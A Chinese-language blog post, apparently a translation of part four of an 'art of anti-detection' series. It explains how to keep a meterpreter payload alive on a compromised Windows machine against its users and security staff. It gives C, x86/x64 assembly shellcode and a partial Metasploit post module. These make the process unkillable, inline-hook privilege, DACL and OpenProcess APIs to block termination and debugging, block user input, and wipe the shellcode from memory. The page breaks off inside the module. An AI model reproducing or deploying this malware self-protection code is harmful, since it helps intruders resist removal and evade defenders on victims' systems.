@@ -1,0 +1,390 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>反检测的艺术4-自保护（翻译） | Lyon&#39;s blog</title>
+  <meta name="author" content="Lyon">
+  
+  <meta name="description" content="Walk steps step by step">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="反检测的艺术4-自保护（翻译）"/>
+  <meta property="og:site_name" content="Lyon&#39;s blog"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  #<link href="/favicon.ico" rel="icon">
+  <link rel="icon" type="image/x-icon" href="/favicon.ico">
+  <link rel="alternate" href="/atom.xml" title="Lyon&#39;s blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link href="//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css" rel="stylesheet">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <script src="/js/jquery.min.js"></script>
+  <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?1d807422614f63c8de98cdc3b546860c";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+  <script>
+    (function(){
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        }
+        else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+    
+  <script data-ad-client="ca-pub-6317609007693835" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+</head>
+
+
+<body>
+  <!--[if lte IE 8]> <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'> <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode"><img src="http://storage.ie6countdown.com/assets/100/images/banners/warning_bar_0027_Simplified Chinese.jpg" border="0" height="42" width="820" alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today." style='margin-left:auto;margin-right:auto;display: block;'/></a></div> <![endif]-->
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">Lyon&#39;s blog</a></h1>
+  <h2><a href="/">I hear and I forget.I see and I remember.I do and I understand.</a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">首页</a></li>
+    
+      <li><a href="/archives">归档</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+	<li> <a href="/atom.xml">RSS</a> </li>
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div></header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+    <div class="gallery">
+  <div class="photoset">
+    
+      <img src="">
+    
+  </div>
+  <div class="control">
+    <div class="prev"></div>
+    <div class="next"></div>
+  </div>
+</div>
+  
+  <div class="post-content">
+    <header>
+      
+        <time datetime="2020-10-02T11:39:22.000Z"><a href="/2020/10/02/Cybersecurity/art-of-anti-detection-4-art-of-anti-detection-4-self-defense/">2020-10-02</a></time>
+      
+      
+  
+    <h1 class="title">反检测的艺术4-自保护（翻译）</h1>
+  
+
+    </header>
+	
+<!-- Table of Contents -->
+
+  <div id="toc" class="toc-article">
+  <strong class="toc-title">文章目录</strong>
+  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00_进程保护"><span class="toc-number">1.</span> <span class="toc-text">0x00 进程保护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">2.</span> <span class="toc-text">参考</span></a></li></ol>
+  </div>
+
+
+	
+    <div class="entry">
+      
+        <p>在反检测的艺术系列中，我们主要研究了如何绕过自动化安全产品的方法，但是在这一部分中，我们将重点介绍几种自保护方法，保护我们在目标终端上的载荷免受其实际用户的破坏。用户可能是缺乏网络技术的员工或也有可能是网络安全部门的蓝队成员。我们的目的是在没有任何特权的情况下存活并在目标终端中隐藏我们的存在。但是，在继续学习之前，我建议您阅读本系列的前几篇文章，因为这些自保护方法包含大量的有关shellcoding和API hooking的前置知识，现在我们开始吧！<br><a id="more"></a><br>在渗透测试时我们常使用meterpreter载荷，因此我们的主要目标将是为Metasploit构建一个后漏洞利用模块。该模块激活后应能够保护运行meterpreter载荷的进程免受用户干预。同样，在设计此模块时，我们将以x86和x64 Shellcode形式实现这些自保护方法，这将使我们能够将该自保护方法部署到其他正在运行的进程中。首先，我们需要考虑用户如何破坏目标系统上的会话。第一个明显的操作是用几个系统内置工具来终止未知/可疑的过程。我们的第一个技巧将是防止进程终止。在本文中，我们将假定我们的meterpreter会话与用户具有相同的特权。因为这是公司网络中最有可能发生的情况。公司的大多数用户帐户没有管理权限。我们将通过利用Windows内部的某些逻辑来尝试实现。因此，该模块应该能够在不提升特权的情况下工作。由于Windows用户帐户控制（UAC）的原因，我们将针对不同的Windows版本考虑不同的策略。</p>
+<h2 id="0x00_进程保护">0x00 进程保护</h2><p>第一个技巧将针对Windows 7及更低版本。尽管Windows 7已有10年的历史，但仍在世界范围内大量使用。在这些版本中，非管理员用户可以创建受保护的进程，这会导致一种奇怪的情况，即用户创建了无法被创建者终止的进程。当一个进程受到保护时，只有管理员用户可以对其进行操作。当非管理员用户尝试终止受保护的进程会弹出错误提示，</p>
+<div align="center"><br><img src="/img/anti_av4_terminate_process.gif" align><br></div>
+
+<p>同样不仅有关终止进程，还禁止所有与打开受保护进程的句柄有关的操作。为了保护进程，我们需要设置一个特殊的安全描述符。根据MSDN，安全描述符结构包含与对象关联的安全信息。如;</p>
+<ul>
+<li>所有者<a href="https://docs.microsoft.com/windows/desktop/SecGloss/s-gly" target="_blank" rel="external">安全标识符</a>（SID）</li>
+<li>组SID</li>
+<li><a href="https://docs.microsoft.com/windows/desktop/SecGloss/d-gly" target="_blank" rel="external">访问控制列表</a>（DACL）</li>
+<li><a href="https://docs.microsoft.com/windows/desktop/SecGloss/s-gly" target="_blank" rel="external">系统访问控制列表</a>（SACL）</li>
+<li>前述项目的预选赛</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> _SECURITY_DESCRIPTOR &#123;</span><br><span class="line">  BYTE                        Revision;</span><br><span class="line">  BYTE                        Sbz1;</span><br><span class="line">  SECURITY_DESCRIPTOR_CONTROL Control;</span><br><span class="line">  PSID                        Owner;</span><br><span class="line">  PSID                        Group;</span><br><span class="line">  PACL                        Sacl;</span><br><span class="line">  PACL                        Dacl;</span><br><span class="line">&#125; SECURITY_DESCRIPTOR, *PISECURITY_DESCRIPTOR;</span><br></pre></td></tr></table></figure>
+<p>这些结构可以用安全描述符字符串格式表示，该格式是用于在安全描述符中存储或传输信息的文本格式。格式是一个以令牌结尾的空终止字符串，用于指示安全描述符的四个主要组成部分：所有者（O :)，主要组（G :)，DACL（D :)和SACL（S :)。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:owner_sid</span><br><span class="line">G:group_sid</span><br><span class="line">D:dacl_flags(string_ace1)(string_ace2)... (string_acen)</span><br><span class="line">S:sacl_flags(string_ace1)(string_ace2)... (string_acen)</span><br></pre></td></tr></table></figure>
+<p>为了保护进程，我们需要将D：P设置为SE_DACL_PROTECTED标志。为了在进程的SECURITY_DESCRIPTOR中设置此类标志，我们需要使用特定的Windows API函数。首先，我们需要将字符串安全描述符格式转换为适当的安全描述符结构。为此，我们将调用<a href="https://docs.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertstringsecuritydescriptortosecuritydescriptora" target="_blank" rel="external">ConvertStringSecurityDescriptorToSecurityDescriptorA</a>函数。该功能采用以下参数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">ConvertStringSecurityDescriptorToSecurityDescriptorA</span><span class="params">(</span><br><span class="line">  LPCSTR               StringSecurityDescriptor,</span><br><span class="line">  DWORD                StringSDRevision,</span><br><span class="line">  PSECURITY_DESCRIPTOR *SecurityDescriptor,</span><br><span class="line">  PULONG               SecurityDescriptorSize</span><br><span class="line">)</span></span>;</span><br></pre></td></tr></table></figure>
+<p>如上所示，需要有一个已经声明的安全描述符结构来设置新的描述符。我们将首先声明一个SECURITY_ATTRIBUTES结构，其中将包含我们的SECURITY_DESCRIPTOR。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SECURITY_ATTRIBUTES sa;</span><br><span class="line">TCHAR * szSD = TEXT(<span class="string">"D:P"</span>);</span><br><span class="line">sa.nLength = <span class="keyword">sizeof</span>(SECURITY_ATTRIBUTES);</span><br><span class="line">sa.bInheritHandle = FALSE;</span><br><span class="line"></span><br><span class="line">ConvertStringSecurityDescriptorToSecurityDescriptor(szSD,SDDL_REVISION_1, &amp;(sa.lpSecurityDescriptor)</span><br></pre></td></tr></table></figure>
+<p>将字符串安全描述符转换为SECURITY_ATTRIBUTES结构之后，现在我们需要获取要保护的进程句柄。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());</span><br></pre></td></tr></table></figure>
+<p>最后，我们将调用SetKernelObjectSecurity，此函数设置内核对象的安全性。设置好准备的安全描述符后，我们的进程终于可以免受野蛮用户的侵害了。现在，我们需要将这一系列API调用转换为shellcode。除了创建SECURITY_ATTRIBUTES结构之外，对此没有什么棘手的问题。我们将总共执行4个API调用，最多包含4个参数。根据我们的shellcoding文章，构造这样的shellcode应该没有问题。唯一棘手的部分是创建SECURITY_ATTRIBUTES结构，因为您需要以字节为单位计算结构的总大小，并在首次创建时复制存储在内部的值。为了简化工作，编译用C编写的代码，然后使用调试器查看SECURITY_ATTRIBUTES结构。</p>
+<div align="center"><br><img src="/img/anti_av4_x86_api.png" align><br></div><br>在x86系统中，此结构的长度为12个字节，在x64系统中，此大小加倍。产生的汇编代码应如下所示；<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">; x86 ConvertStringSecurityDescriptorToSecurityDescriptor call</span><br><span class="line">    push <span class="number">0x00503a44</span>            ; <span class="string">"D:P"</span></span><br><span class="line">    sub esp,<span class="number">4</span>                  ; Push the address of <span class="string">"D:P"</span> <span class="built_in">string</span> to <span class="built_in">stack</span></span><br><span class="line">    push <span class="number">0x00000000</span>            ; FALSE</span><br><span class="line">    lea eax, [esp+<span class="number">4</span>]           ; Load the address of <span class="number">4</span> byte buffer to EAX</span><br><span class="line">    push eax                   ; Push the <span class="number">4</span> byte buffer address</span><br><span class="line">    push <span class="number">0x00000001</span>            ; SDDL_REVISION_1 </span><br><span class="line">    lea eax, [esp+<span class="number">16</span>]          ; Load the address of <span class="string">"D:P"</span> <span class="built_in">string</span> to EAX</span><br><span class="line">    push eax                   ; Push the EAX value</span><br><span class="line">    push <span class="number">0xDA6F639A</span>            ; hash(advapi32.dll, ConvertStringSecurityDescriptorToSecurityDescriptor)</span><br><span class="line">    call ebp                   ; ConvertStringSecurityDescriptorToSecurityDescriptor(<span class="string">"D:P"</span>,SDDL_REVISION_1,FALSE)</span><br></pre></td></tr></table></figure><br><br>其余的shellcoding应该更容易。我们还需要考虑一个微小的细节。我们将使用Metasploit框架的<a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Post/Windows/Process:execute_shellcode" target="_blank" rel="external">execute_shellcode</a>函数。此函数只是将shellcode注入进程，然后通过打开远程线程来执行它。执行完后，我们的shellcode需要调用适当的函数来正确终止线程。这意味着我们需要在所有shellcode的末尾附加<a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_exitfunk.asm" target="_blank" rel="external">block_exitfunk.asm</a>代码。该块确定当前的Windows版本，并相应地调用适当的退出函数。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[BITS <span class="number">64</span>]</span><br><span class="line"></span><br><span class="line">exitfunk:</span><br><span class="line">  mov ebx, <span class="number">0x0A2A1DE0</span>   ; The EXITFUNK as specified by user...</span><br><span class="line">  mov r10d, <span class="number">0x9DBD95A6</span>  ; hash( <span class="string">"kernel32.dll"</span>, <span class="string">"GetVersion"</span> )</span><br><span class="line">  call rbp              ; GetVersion(); (AL will = major version and AH will = minor version)</span><br><span class="line">  add rsp, <span class="number">40</span>           ; cleanup the <span class="keyword">default</span> param space on <span class="built_in">stack</span></span><br><span class="line">  cmp al, byte <span class="number">6</span>        ; If we are not running on Windows Vista, <span class="number">2008</span> or <span class="number">7</span></span><br><span class="line">  jl <span class="keyword">short</span> goodbye      ; Then just call the <span class="built_in">exit</span> function...</span><br><span class="line">  cmp bl, <span class="number">0xE0</span>          ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, <span class="number">2008</span> or <span class="number">7.</span>..</span><br><span class="line">  jne <span class="keyword">short</span> goodbye     ;</span><br><span class="line">  mov ebx, <span class="number">0x6F721347</span>   ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread</span><br><span class="line">goodbye:                ; We now perform the actual call to the <span class="built_in">exit</span> function</span><br><span class="line">  push byte <span class="number">0</span>           ;</span><br><span class="line">  pop rcx               ; <span class="built_in">set</span> the <span class="built_in">exit</span> function parameter</span><br><span class="line">  mov r10d, ebx         ; place the correct EXITFUNK into r10d</span><br><span class="line">  call rbp              ; <span class="function">call <span class="title">EXITFUNK</span><span class="params">( <span class="number">0</span> )</span></span>;</span><br></pre></td></tr></table></figure><br><br>这是此方法的完整<a href="https://github.com/EgeBalci/SelfDefense/blob/master/x86/ProtectProcess/protect_process.asm" target="_blank" rel="external">x86</a>和<a href="https://github.com/EgeBalci/SelfDefense/blob/master/x64/ProtectProcess/protect_process.asm" target="_blank" rel="external">x64</a> shellcode。但是这种方法只能解决一半的过程终止问题。具有管理特权的用户仍可以通过以管理员身份运行进程终止工具来终止受保护的进程。因此，我们的第二个技巧应该用户UAC提权。<br><br>## 防止提权<br>为了防止特权提升，我们需要了解进程如何获取某些特权。当进程需要执行某些任务时，因此它需要具有适当的访问令牌，需要特殊的权限。终止或打开受保护进程的句柄也需要某些令牌。有几种获取这些访问令牌的方法，几乎​​所有方法都包括以下两个API函数的使用：<br><br>第一个是<a href="https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges" target="_blank" rel="external">AdjustTokenPrivileges</a>，此功能启用或禁用指定访问令牌中的特权。几乎所有需要令牌操作的特权操作都使用此API函数。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">AdjustTokenPrivileges</span><span class="params">(</span><br><span class="line">  HANDLE            TokenHandle,</span><br><span class="line">  BOOL              DisableAllPrivileges,</span><br><span class="line">  PTOKEN_PRIVILEGES NewState,</span><br><span class="line">  DWORD             BufferLength,</span><br><span class="line">  PTOKEN_PRIVILEGES PreviousState,</span><br><span class="line">  PDWORD            ReturnLength</span><br><span class="line">)</span></span>;</span><br></pre></td></tr></table></figure><br><br>第二个重要函数是<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-rtlsetdaclsecuritydescriptor" target="_blank" rel="external">RtlSetDaclSecurityDescriptor</a>，此函数设置绝对格式安全描述符的DACL信息，或者如果安全描述符中已经存在DACL，则将其取代。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSYSAPI NTSTATUS <span class="title">RtlSetDaclSecurityDescriptor</span><span class="params">(</span><br><span class="line">  PSECURITY_DESCRIPTOR SecurityDescriptor,</span><br><span class="line">  BOOLEAN              DaclPresent,</span><br><span class="line">  PACL                 Dacl,</span><br><span class="line">  BOOLEAN              DaclDefaulted</span><br><span class="line">)</span></span>;</span><br></pre></td></tr></table></figure><br><br>从理论上讲，如果我们能够找到一种方法来禁用进程中的这两个功能，让它根本无法更改其令牌特权，因此无法执行特权操作。为了在远程进程中禁用这两个功能，我们需要使用内联API挂钩。我们使用内联挂钩的原因是因为我们的目标主要是任务管理器之类的系统进程。这些系统二进制文件没有在导入地址表中使用函数地址，而是在运行时动态加载所需的API函数。因此，patch IAT条目（IAT挂钩）对我们而言不起作用，我们需要能够直接重定向或patch这些功能。为了实现这一点，我们需要使用一个内联钩子汇编块。此块patch了函数序言的前两个字节，使我们可以将函数重定向到其他地方或返回任何值。在我们的情况下，我们需要它返回true。这个汇编模块，它需要一个名为patch的二进制文件，其中包含在函数序言部分写入汇编指令功能。为了从这些函数返回true，应遵循以下说明；<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; x64 <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">db <span class="number">0x48</span>,<span class="number">0x31</span>,<span class="number">0xc0</span>    ; xor rax,rax</span><br><span class="line">db <span class="number">0xc3</span>              ; ret</span><br><span class="line"></span><br><span class="line">; x86 <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">db <span class="number">0x32</span>,<span class="number">0xc0</span>         ; xor eax,eax</span><br><span class="line">db <span class="number">0xc3</span>              ; ret</span><br></pre></td></tr></table></figure><br><br>现在，此块将使用给定的哈希值对函数进行修补，并使其返回零。一旦在进程内执行此shellcode，任何令牌提升尝试都将返回false，因此该进程将无法升级特权。<br><br><br>## 阻止输入<br><br>这是次要的细节。我们的meterpreter载荷可能正在带有图形用户界面的应用程序内部运行，这可能意味着可能有多个按钮用于终止应用程序。通过调用<a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-blockinput" target="_blank" rel="external">BlockInput</a> API函数，我们将阻止所有键盘和鼠标输入事件到达托管有效载荷的应用程序。<br><br>## 自我移除<br>这是开发此模块的最重要作用之一。我没有指定调用API函数的任何特定方法，可以通过几种方法来完成，但是更简单的方法是使用Metasploit block API。但使用block API具有很大的挑战，可被安全产品检测到。在尝试保持存在并保持存活的同时，我们还需要从内存中删除所有可疑shellcode，尤其是block API。因此，在完成保护进程并在其他进程进行hook之后，我们需要设置一个序幕prologue，该序幕prologue将清除内存中的shellcode。但是此任务有点棘手，因为要终止线程，我们需要调用适当的API函数。要调用函数，我们还需要block API。这种情况迫使我们首先获取所需的终止函数地址，然后从内存中擦除shellcode。生成的shellcode应该看起来像这样；<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">    push 0x0000006c                 ; 0x00,l</span><br><span class="line">    push 0x6c642e6c                 ; ld.l</span><br><span class="line">    push 0x6c64746e                 ; ldtn</span><br><span class="line">    push esp                        ; &amp;"ntdll.dll"</span><br><span class="line">    push 0x0726774C                 ; hash("KERNEL32.dll", "LoadLibraryA")</span><br><span class="line">    call ebp                        ; LoadLibraryA("ntdll.dll")</span><br><span class="line">    push 0x00000064                 ; 0x00,d</span><br><span class="line">    push 0x61657268                 ; aerh</span><br><span class="line">    push 0x54726573                 ; Tres</span><br><span class="line">    push 0x55746978                 ; Utix</span><br><span class="line">    push 0x456c7452                 ; EltR</span><br><span class="line">    push esp                        ; &amp;"RtlExitUserThread"</span><br><span class="line">    push eax                        ; HANDLE (KERNEL32.dll)</span><br><span class="line">    push 0x7802F749                 ; hash("KERNEL32.dll", "GetProcAddress")</span><br><span class="line">    call ebp                        ; GetProcAddress(HANDLE, "RtlExitUserThread")</span><br><span class="line">    mov ebp,eax                     ; Save the RtlExitUserThread address to EDI</span><br><span class="line">    ; PEB manipulation</span><br><span class="line">    xor eax,eax                     ; Zero EAX (upper 3 bytes will remain zero until function is found)</span><br><span class="line">    mov ebx,[fs:eax+0x30]           ; Get a pointer to the PEB</span><br><span class="line">    mov ebx,[ebx+0x0C]              ; Get PEB-&gt;Ldr  </span><br><span class="line">    mov eax,[ebx + 0x0C]            ; InOrderModuleList</span><br><span class="line">    mov dword [eax+0x20],0xFFFFFF   ; SizeOfImage</span><br><span class="line">    ; Wipe self defense shellcode</span><br><span class="line">total_size: equ $-self_defense      ; Set the size of the self defense shellcode to total_size label</span><br><span class="line">    mov ecx,total_size              ; Move the total size of the self defense shellcode to ECX</span><br><span class="line">    call $+5</span><br><span class="line">    pop eax</span><br><span class="line">clean:</span><br><span class="line">    mov byte [eax],0x00             ; Wipe 1 byte</span><br><span class="line">    dec eax                         ; Increase index</span><br><span class="line">    loop clean                      ; Loop until all shellcode cleared from memory</span><br><span class="line">    push 0x00                       ; NULL              </span><br><span class="line">    call ebp                        ; RtlExitUserThread(0)</span><br></pre></td></tr></table></figure><br><br>对于某些安全产品，从内存中删除shellcode可能不够。设计变形编码器可能非常有帮助。为了简短起见，我不会在本文中包括编码部分。在编写了自我删除序言prologue之后，现在我们将它们全部合并在一起，最终的<a href="https://github.com/EgeBalci/SelfDefense/blob/master/x86/self_defense.asm" target="_blank" rel="external">x86</a>和<a href="https://github.com/EgeBalci/SelfDefense/blob/master/x64/self_defense.asm" target="_blank" rel="external">x64</a>自保护shellcode已准备好了。在继续执行Metasploit模块之前，我们还需要针对Windows不同版本实现不同的解决方案，该版本的Windows我们的之前提出的进程保护技术无效。<br><br>## 防止被终止<br><br>没有受保护的进程，Windows 8/10用户可以直接终止我们的会话。在这种情况下该怎么办？经过深思熟虑，一个明显的答案就浮现了，我们可以简单地在所有能够终止进程的程序中禁用所有进程终止API。但是我们还需要保护我们的载荷以免被分析。调试器和任何类型的监视工具也不应附加到我们的进程中。所有这些都可以通过挂钩OpenProcess API来实现。由于<a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess" target="_blank" rel="external">OpenProcess</a>是非常基础的API，我们可以通过注入进程利用多种方式对其削弱。某些程序一旦调用OpenProcess失败就会崩溃。这可以以更安全和隐秘的方式完成。我之所以选择它是因为懒，但是这解决了我们的进程被终止问题。我们可以使用前面的钩子shellcode。唯一需要更改的是传递给内联钩子块的函数散列。添加此代码后，我们的shellcoding阶段结束。<br><br><br>## Metasploit模块<br>现在，我们需要构造MSF post模块，该模块会将我们的shellcode注入相应的进程中。让我们从选择一个漏洞利用后模块模板开始。我们的模块不会采用任何强制性参数。将有两个可选参数，分别称为PID和LOOP。该模块应能够保护托管我们的meterpreter载荷的进程。 PID参数将指定要注入我们的shellcode的进程ID。 LOOP参数将指定模块是否连续运行。以下模板设置所需的漏洞利用后类和元数据。<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">class MetasploitModule &lt; Msf::Post</span><br><span class="line"></span><br><span class="line">  include Msf::Post::File</span><br><span class="line">  include Msf::Post::Windows::Process</span><br><span class="line"></span><br><span class="line">  def initialize(info = &#123;&#125;)</span><br><span class="line">    super(update_info(info,</span><br><span class="line">        'Name'          =&gt; 'Process Protector',</span><br><span class="line">        'Description'   =&gt; %q&#123;</span><br><span class="line">          This module will protect the given process with injecting special shellcodes and disabling key API functions using inline hooking.</span><br><span class="line">        &#125;,</span><br><span class="line">        'License'       =&gt; MSF_LICENSE,</span><br><span class="line">        'Author'        =&gt; [ 'Ege Balcı' ],</span><br><span class="line">        'Platform'      =&gt; [ 'win'],</span><br><span class="line">        'SessionTypes'  =&gt; [ 'meterpreter']</span><br><span class="line">    ))</span><br><span class="line">        </span><br><span class="line">    register_options([</span><br><span class="line">      OptString.new('PID', [false, 'The target process ID for the UAC elevation.' ]),</span><br><span class="line">      OptBool.new('LOOP', [false, 'Continiously check running processes for elevation prevention.' ]),</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><br><br>在声明了初始元数据和类之后，现在我们将构造run方法。首先，我们需要检查该会话是否为meterpreter会话。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># Make sure we meet the requirements before running the script, note no need to return</span></span><br><span class="line">    <span class="preprocessor"># unless <span class="keyword">error</span></span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> session.type != <span class="string">"meterpreter"</span></span><br></pre></td></tr></table></figure><br><br>现在检查会话类型之后，我们将检查是否指定了特殊的PID值。如果不是，则此模块应针对包含我们的Meterpreter会话的进程。我们可以通过一个简单的检查来做到这一点，Metasploit中的每个post模块都有一个<a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Client" target="_blank" rel="external">client类</a>。根据ruby文档，此类提供了一个与Rex开发后接口兼容的接口，该接口试图公开其功能集。此类旨在驱动单个meterpreter客户端会话。通过调用client.sys.process.getpid，我们可以获得获取会话的进程的当前进程ID。<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if datastore['PID'].to_s == ''</span><br><span class="line">  pid = client.sys.process.getpid.to_i</span><br><span class="line">else</span><br><span class="line">  pid = datastore['PID'].to_i</span><br><span class="line">end</span><br></pre></td></tr></table></figure><br><br>为了避免在shellcode程序代码中重复使用块API，我们将声明一次并在所有shellcode程序代码中使用它们。实际上，Metasploit已经具有生成内置在其中的block_api.asm的机制。但是由于懒，我直接在模块内部声明了已组装的block_api.asm。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># https:<span class="comment">//github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm</span></span></span><br><span class="line">block_api_32 = <span class="string">""</span></span><br><span class="line">block_api_32 &lt;&lt; <span class="string">"\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c"</span></span><br><span class="line"><span class="preprocessor"># SNIP ...</span></span><br><span class="line">block_api_32 &lt;&lt; <span class="string">"\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"</span></span><br><span class="line">block_api_32 &lt;&lt; <span class="string">"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d"</span></span><br><span class="line"></span><br><span 